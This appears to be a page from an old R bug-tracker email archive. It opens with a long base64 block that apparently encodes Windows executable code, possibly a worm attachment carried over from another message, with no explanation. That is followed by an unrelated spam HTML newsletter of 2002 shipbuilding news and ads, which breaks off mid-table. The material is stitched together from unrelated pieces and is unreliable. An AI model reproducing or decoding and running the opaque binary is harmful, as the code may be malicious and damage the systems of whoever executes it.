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
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2205 *
Subject: Maritime News (Week 43)
From: "Marine Digital Inc."<newsletter@marinedigital.com>
Date: Thu, 24 Oct 2002 07:15:12 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2205 <==
From newsletter@marinedigital.com  Thu Oct 24 00:20:32 2002
Received: from localhost ([61.32.165.61])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id AAA23828
	for <r-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 00:20:26 +0200 (MET DST)
Message-Id: <200210232220.AAA23828@pubhealth.ku.dk>
Reply-To: newsletter@marinedigital.com
From: "Marine Digital Inc."<newsletter@marinedigital.com>
To: r-bugs@biostat.ku.dk
Subject: Maritime News (Week 43)
Mime-Version: 1.0
Content-Type: text/html; charset="iso-8859-1"
Date: Thu, 24 Oct 2002 07:15:12 +0900

<html>
<head>
<title>MarineDigital Newsletter</title>
<link rel="stylesheet" type="text/css" href="http://www.marinedigital.com/style_marine.css">
</head>
<BODY text=#000000 bgColor=#ffffff leftMargin=0 topMargin=0 marginwidth="0"
marginheight="0">
<DIV align=center>
<TABLE cellSpacing=0 borderColorDark=#ffffff cellPadding=0 width=590
borderColorLight=#808040 border=0>
<TBODY>
<TR>
<TD vAlign=top width=590 height=54>
<TABLE height=3 cellSpacing=0 cellPadding=0 width=590 border=0>
<TBODY>
<TR>
<TD height=3><IMG height=50
src="http://www.marinedigital.com/en/news/img/top.gif"
width=580></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD bgColor=#ffffff height=1></TD></TR>
<TR>
<TD class=wtext align=center bgColor=#a9340f height=17><A
href="http://www.marinedigital.com/en/mall/ship/index.asp"><FONT
color=#ffffff>SHIP S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/product/index.asp"><FONT
color=#ffffff>NEW PRODUCT S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/equipment/index.asp"><FONT
color=#ffffff>USED PRODUCT S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/spare/index.asp"><FONT
color=#ffffff>SPARE PART S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/partner/index.asp"><FONT
color=#ffffff>PARTNER ALLIANCE</FONT></A></TD></TR>
<TR>
<TD>
<TABLE height=1 cellSpacing=1 cellPadding=0 bgColor=#999999 border=0>
<TBODY>
<TR>
<TD vAlign=top width=170 bgColor=#ffffff height=1>
<TABLE height=287 cellSpacing=0 cellPadding=0 width=170 border=0>
<TBODY>
<TR>
<TD class=wtext style="padding-top: 2; padding-bottom: 2"
align=center bgColor=#fdae02 height=47><FONT
color=#2b4996><B>WEEK 43</B></FONT><BR><B>ISSUE 67, 23<sup>th</sup>&nbsp;
Oct. 2002</B><BR><A
href="http://www.marinedigital.com">www.marinedigital.com</A></TD></TR>
<tr>
<TD class=text style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD>
</tr>
<tr>
<TD class=text style="padding-top: 2; padding-bottom: 2"
bgColor=#fce1a4 height=16><b>&nbsp; - Newsletter Readers -</b><br>
&nbsp;&nbsp;&nbsp; <font color="#e1330b"><b>143,361</b> </font>Maritime
people<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b><font color="#e1330b"> 60,420
</font></b>Companies</TD>
</tr>
<TR>
<TD class=text style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD></TR>
<TR>
<TD class=text
style="border: 2px outset #FFFFFF; padding-top: 1; padding-bottom: 1"
bgColor=#fdd06d height=22>
<P align=center><A
href="http://www.marinedigital.com/en/newsletter_form/letter.asp"><FONT
color=#990000><B>Subscribe the newsletter</B></FONT></A>
</P></TD></TR>
<TR>
<TD class=text
style="border: 2px outset #FFFFFF; padding-top: 1; padding-bottom: 1"
bgColor=#fdd06d height=22>
<P align=center><ALIGN="CENTER"><A
href="http://www.marinedigital.com/en/mar_unsubscribe.asp?nw_email=r-bugs@biostat.ku.dk"
target=_blank><FONT
color=#ff0000><B>Unsubscribe</B></FONT></A><FONT
color=#ff0000><B></B></FONT></P></TD></TR>
<tr>
<TD
bgColor=#FD7E02 height=18 align="center" style="line-height: 100%; padding-top: 2; padding-bottom: 2">
<P class=text align=left><font color="#FFFFFF"><B>&nbsp;&nbsp;&nbsp;&nbsp;
RELATED NEWSLETTERS
</B> </font></P></TD>
</tr>
<tr>
<TD class=text style="padding-top: 2; padding-bottom: 2"
bgColor=#fce1a4 height=16><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12>       <a href="http://www.marinedigital.com/en/news/s_p_news/020917.htm">Ship
S&amp;P Newsletter</a></TD>
</tr>
<tr>
<TD class=text style="padding-top: 2; padding-bottom: 2"
bgColor=#fce1a4 height=14><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12>      <a href="http://www.marinedigital.com/en/news/used_news/020918/neud.htm">Used
Products Newsletter</a></TD>
</tr>
<TR>
<TD class=wtext style="padding-top: 2; padding-bottom: 2"
align=center bgColor=#fd7e02 height=17><B>YOUR FREE
POSTING</B></TD></TR>
<tr>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8> <A
href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipSaleRegister">Sell
Ship</A><BR><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8> <A
href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipPurchaseRegister">Purchase
Ship</A></TD>
</tr>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#FAC64B height=35><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8>&nbsp; <a href="http://www.marinedigital.com/en/mall/Shipbuilding/index.asp?menu_code=ShipNewRegister">Post
Newbuilding Inquiry</a><BR><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8>&nbsp; <a href="http://www.marinedigital.com/en/mall/Shipbuilding/index.asp?menu_code=ShipBuildersRegister">Post
Your Shipbuilder</a></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipSaleRegister">Sell
New Product</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipPurchaseRegister">Purchase
New Product</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleRegister">Sell
Used Product</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentPurchaseRegister">Purchase
Used Product</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventorySaleRegister">Sell
Inventories</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventoryPurchaseRegister">Purchase
Inventories</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SpareSaleRegister">Sell
Spare Part</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SparePurchaseRegister">Purchase
Spare Part</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerLookingRegister">Looking
for Partner</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerWantingRegister">Wanting
your Partner</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/ship_repairs/form/repair.asp">Ship
Repair Inquiry</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/ship_repairs/form/regist01.asp">Join
Repair Network</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=17><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/products_sell/registration/form.asp">PANAMA
Flag Registration</A></TD></TR>
<TR>
<TD class=text style="padding-top: 1; padding-bottom: 1"
bgColor=#fce1a4 height=17><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.netnaru.net/marinedigital/en/tracking_sys/main.asp">Ship
Tracking System</A></TD></TR>
<TR>
<TD class=text
style="border: 2px ridge #FDD06D; padding-top: 1; padding-bottom: 1"
vAlign=center align=middle bgColor=#fdd06d height=60><B><FONT
color=#990000>:: YOUR BANNER ADVERTISEMENT(US$180)
::<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</FONT></B><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12><FONT color=#666666><B> <FONT color=#808080><A
href="http://www.marinedigital.com/en/mall/product/index.asp?menu_code=ShipSaleView&amp;GoodsNo=S51602036">Send
your Ads</A></FONT></B></FONT></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fdd06d height=1></TD></TR>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><A
href="http://www.marinedigital.com/en/products_sell/hdvalve/intro.asp"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/banner_valve.gif"
width=170 border=0></A></TD>
</tr>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><a href="http://www.marinedigital.com/en/products_sell/accommterior/main.asp"><img border="0" src="http://www.marinedigital.com/en/news/img/accomterior.jpg" width="170" height="45"></a></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><A
href="http://www.penta.volvo.se/t/003.asp?id=12&amp;p=4"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/banner_volvo.gif"
width=170 border=0></A></TD></TR>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><a href="http://www.marinedigital.com/en/shipbuilding/green/"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/green_banner.gif"
width=170 border=0></a></TD>
</tr>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><a href="http://www.marinedigital.com/en/products_sell/nasan/introduction.asp"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/nasan-41.gif"
width=170 border=0></a></TD>
</tr>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD></TR>
<TR>
<TD style="padding-top: 1; padding-bottom: 1"
bgColor=#fdae02 height=70>
<P class=text style="MARGIN-LEFT: 7px" align=left><FONT
color=#4c598f>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>:::
Contact Point :::</B> <BR>Business Team, </FONT><A href="mailto:sales@marinedigital.com"><FONT
color=#0000ff>Steve Kim</FONT></A><FONT color=#4c598f><BR>Tel
: 82-2-966-6701<BR>Fax : 82-2-966-6703</FONT></P></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD></TR>
</TBODY></TABLE></TD>
<TD vAlign=top align=right width=420 bgColor=#ffffff height=1>
<TABLE height=1 cellSpacing=0 cellPadding=0 width=410
bgColor=#999999 border=0>
<TBODY>
<tr>
<TD class=text style="padding-top: 2px; padding-bottom: 2px" width=408 bgColor=#FFFFFF colSpan=2
height=2> </TD>
</tr>
<tr>
<TD class=text style="padding-top: 2px; padding-bottom: 2px" width=408 bgColor=#800000 colSpan=2
height=1> </TD>
</tr>
<TR>
<TD class=text style="padding-top: 2px; padding-bottom: 2px"
align=center width=408 bgColor=#fed203 colSpan=2
height=1><B><FONT color=#294efa>:: MARITIME NEWS
::</FONT></B> </TD></TR>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=1>&nbsp;1. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=1>China Shipbuilding Industry
Corp(CSIC) contracted four 53,000DWT bulk carriers with Graig
Group. </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=21>&nbsp;2. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=21>Aker Finnyards (Finland)
contracted a 2500 Pax. passenger ship with Tallink (Estonia),
at EURO 150mill.
</TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=1>&nbsp;3. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=1>Dalian New Shipbuilding (China) contracted a 110,000dwt Aframax Tanker with China Shipping Development
Co(CSDC).&nbsp; </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=21>&nbsp;4. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=21>Oshima (Japan) contracted a
52,500dwt handymax bulk carrier with Taiwan Navigation
(Taiwan), at USD19mill.
</TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
